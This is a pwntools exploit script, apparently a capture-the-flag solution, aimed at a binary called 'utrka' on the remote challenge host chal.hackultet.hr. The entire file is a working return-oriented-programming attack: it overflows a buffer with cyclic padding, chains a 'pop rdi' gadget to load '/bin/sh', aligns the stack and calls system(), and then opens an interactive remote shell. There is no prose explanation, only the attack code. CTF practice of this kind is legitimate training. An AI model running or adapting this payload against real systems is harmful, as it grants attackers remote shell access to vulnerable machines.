from pwn import *

elf = ELF('./utrka')
rop = ROP(elf)

payload = b'A' * cyclic_find(0x63616171)                     # padding
payload += p64(rop.find_gadget(['pop rdi', 'ret']).address)  # pop address of /bin/sh into rdi
payload += p64(next(elf.search(b'/bin/sh')))                 # address of /bin/sh
payload += p64(rop.find_gadget(['ret']).address)             # align stack frame
payload += p64(elf.symbols['system'])                        # profit

r = remote('chal.hackultet.hr', 13015)
r.sendline(payload)
r.interactive()
